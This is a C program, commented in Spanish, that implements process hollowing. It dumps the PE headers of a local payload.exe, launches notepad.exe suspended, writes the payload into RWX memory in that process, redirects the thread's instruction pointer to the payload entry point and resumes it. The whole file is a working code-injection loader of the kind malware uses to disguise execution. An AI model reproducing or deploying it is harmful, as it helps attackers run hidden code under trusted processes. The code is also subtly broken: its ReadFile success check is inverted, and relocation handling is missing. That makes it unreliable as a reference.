#include <windows.h>
#include <stdio.h>

void MostrarCabeceraDOS(PIMAGE_DOS_HEADER dos) {
    printf("--- Cabeceras DOS ---\n");
    printf("-----------------------------------------\n");
    //Número Mágico
    printf("| e_magic: %X\t\t\t\t|\n", dos->e_magic);
    //Apunta al offset de la estructura IMAGE_NT_HEADERS
    printf("| e_lfanew (offset NT_HEADERS): 0x%X\t|\n", dos->e_lfanew);
    printf("-----------------------------------------\n");
}

void MostrarCabeceraNT(PIMAGE_NT_HEADERS64 nt) {
    printf("--- Cabeceras NT ---\n");
    printf("-----------------------------------------\n");
    //Indica el inicio válido de la cabecera
    printf("| Signature: 0x%X\t\t\t|\n", nt->Signature);
    //Tipo de arquitectura 0x8664 = x64
    printf("| Machine: 0x%X\t\t\t|\n", nt->FileHeader.Machine);
    //Número de secciones (.text, .data...)
    printf("| NumberOfSections: %d\t\t\t|\n", nt->FileHeader.NumberOfSections);
    //Tamaño del optional Header
    printf("| SizeOfOptionalHeader: 0x%X\t\t|\n", nt->FileHeader.SizeOfOptionalHeader);
    //Flags del binario
    printf("| Characteristics: 0x%X\t\t\t|\n", nt->FileHeader.Characteristics);
    printf("-----------------------------------------\n");

    printf("\n--- Cabeceras Opcionales ---\n");
    printf("-----------------------------------------\n");
    //Tipo de binario
    printf("\t Magic: 0x%X\t\t\t|\n", nt->OptionalHeader.Magic);
    //RVA (Relative Virtual Address) donde comienza la ejecución
    //Es decir, una dirección relativa al ImageBase del ejecutable en memoria.
    //Para convertira a una dirección real = ImageBase + AddressOfEntryPoint
    printf("\t AddressOfEntryPoint: 0x%X\t|\n", nt->OptionalHeader.AddressOfEntryPoint);
    //Image base es la dirección en la memoria virtual donde el ejecutable se debería de cargar.
    printf("\t ImageBase: 0x%llX\t\t|\n", nt->OptionalHeader.ImageBase);
    //Indica comod deben de estar las secciones del ejecutable en memoria cuando se carguen
    printf("\t SectionAlignment: 0x%X\t|\n", nt->OptionalHeader.SectionAlignment);
    printf("\t FileAlignment: 0x%X\t\t|\n", nt->OptionalHeader.FileAlignment);
    //Tamaño total en memoria que ocupará el ejecutable cuando esté cargado en RAM.
    printf("\t SizeOfImage: 0x%X\t\t|\n", nt->OptionalHeader.SizeOfImage);
    //Tamaño de todas las cabeceras + alineación
    printf("\t SizeOfHeaders: 0x%X\t\t|\n", nt->OptionalHeader.SizeOfHeaders);
    //Subsystem Tipo de aplicación: `0x2` = GUI, `0x3` = CUI (consola)
    printf("\t Subsystem: 0x%X\t\t\t|\n", nt->OptionalHeader.Subsystem);
    //Cantidad de entradas en la tabla de directorios de datos
    printf("\t NumberOfRvaAndSizes: %d\t|\n", nt->OptionalHeader.NumberOfRvaAndSizes);
    printf("-----------------------------------------\n");
}

void MostrarSecciones(PIMAGE_SECTION_HEADER section, int num) {
    printf("\n--- SECCIONES ---\n");
    for (int i = 0; i < num; i++) {
        printf("-----------------------------------------\n");
        printf("Seccion %d: %s\n", i + 1, section[i].Name);
        //Indica la dirección relativa a la ImageBase en la que esa sección será cargada en memoria cuando
        //el ejecutable se mapea en un proceso
        printf("|\tVirtualAddress: 0x%X\t\t|\n", section[i].VirtualAddress);
        //Indica el tamaño de los datos de la sección en el PE
        printf("|\tSizeOfRawData:  0x%X\t\t|\n", section[i].SizeOfRawData);
        //Indica la posicion (offset) dentro del PE donde comienza la sección en disco
        printf("|\tPointerToRawData: 0x%X\t|\n", section[i].PointerToRawData);
        //Indica los atributos y permisos de esa sección del archivo PE.
        printf("|\tCharacteristics: 0x%X \t|\n\n", section[i].Characteristics);
        printf("-----------------------------------------\n");
    }
}

int main() {
    const char* rutaPayload = "C:\\Users\\aaron\\source\\repos\\Hollowing\\payload.exe";

    HANDLE hFile = CreateFileA(rutaPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error al abrir el archivo: %lu\n", GetLastError());
        return 1;
    }

    //sizeFile
    DWORD sFile = GetFileSize(hFile, NULL);
    //Reserva de un bloque de memoria dinámica en el heap durante la ejecución del programa
    BYTE* buffer = (BYTE*)malloc(sFile);
    DWORD bytesLeidos;

    //ReadFile almacena los datos leidos en el buffer
    if (ReadFile(hFile, buffer, sFile, &bytesLeidos, NULL)) {
        printf("[-] Error al almacenar los datos en el buffer: %lu\n", GetLastError());
        return 1;
    }

    // Cabeceras
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(buffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER secciones = (PIMAGE_SECTION_HEADER)(nt + 1);

    printf("\n[+] Mostrando headers y secciones del PE: %s\n\n", rutaPayload);
    MostrarCabeceraDOS(dos);
    MostrarCabeceraNT(nt);
    MostrarSecciones(secciones, nt->FileHeader.NumberOfSections);

    // Crear proceso suspendido
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Error creando el proceso: %lu\n", GetLastError());
        return 1;
    }

    // Reservar memoria en el proceso remoto
    LPVOID memReservada = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!memReservada) {
        printf("[-] Error reservando memoria: %lu\n", GetLastError());
        return 1;
    }

    printf("\n[+] Memoria reservada en %p: \n", memReservada);

    // Escribir Headers
    if (!WriteProcessMemory(pi.hProcess, memReservada, buffer, nt->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("[-] Error escribiendo headers\n");
        return 1;
    }

    printf("[+] Header escritos correctamente en memoria\n");

    // Escribir secciones
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        //Dirección virtual dentro del proceso remoto donde debe ir esta sección. Se calcula memReservada(donde reservamos el ImageBase) + VirtualAddress (offset virtual de la sección).
        LPVOID destino = (LPVOID)((BYTE*)memReservada + secciones[i].VirtualAddress);
        //La dirección del buffer local donde está el contenido binario de está sección. Se calcula buffer (variable donde cargamos el .exe) + PointerToRawData(Offset dentro del archivo)).
        LPVOID origen = buffer + secciones[i].PointerToRawData;
        //Tamaño de la sección en disco
        SIZE_T tam = secciones[i].SizeOfRawData;

        if (!WriteProcessMemory(pi.hProcess, destino, origen, tam, NULL)) {
            printf("[-] Error escribiendo sección %lu\n", GetLastError());
            return 1;
        }

        printf("[+] Seccion: %s escrita correctamente | RawOffset: 0x%08X | VA: 0x%08X | Tamano: %Iu bytes | Origen: 0x%p | Destino: 0x%p\n", secciones[i].Name, secciones[i].PointerToRawData, secciones[i].VirtualAddress, tam, origen, destino);
    }

    // Obtener contexto y redirigir ejecución
    CONTEXT contexto = { 0 };
    contexto.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &contexto)) {
        printf("[-] Error obteniendo contexto del hilo\n");
        return 1;
    }

    // EntryPoint remoto
    // En caso de que la dirección tenga una primera instrucción válida también podría usarse el registro Rcx
    //contexto.Rcx = (DWORD64)((BYTE*)memReservada + nt->OptionalHeader.AddressOfEntryPoint);
    contexto.Rip = (DWORD64)((BYTE*)memReservada + nt->OptionalHeader.AddressOfEntryPoint);


    printf("[+] Entrypoint: 0x%08llX + 0x%08llX\n", (DWORD64)((BYTE*)memReservada), (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint));
    //Para convertir a a una dirección real = ImageBase + AddressOfEntryPoint
    printf("[+] El registro Rip ahora es: 0x%08llX\n", contexto.Rip);

    if (!SetThreadContext(pi.hThread, &contexto)) {
        printf("[-] Error estableciendo nuevo contexto\n");
        return 1;
    }

    ResumeThread(pi.hThread);

    printf("[+] Manual mapping completado y ejecutandose.\n");

    free(buffer);
    CloseHandle(hFile);
    return 0;
}
